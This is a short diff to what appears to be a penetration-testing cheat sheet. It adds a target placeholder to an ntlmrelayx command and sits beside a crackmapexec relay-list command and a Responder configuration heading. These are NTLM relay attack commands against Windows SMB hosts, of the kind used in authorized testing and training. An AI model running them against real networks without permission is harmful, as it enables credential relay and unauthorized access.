@@ -61,7 +61,7 @@ crackmapexec smb <IPs> --gen-relay-list <output.txt>
 ```
 #### NTLMRelayx
 ```bash
-sudo python3 ntlmrelayx.py -smb2support -tf
+sudo python3 ntlmrelayx.py -smb2support -tf <IPs>
 ```
 #### Disbale SMB and HTTP in Responder.conf
 ```bash
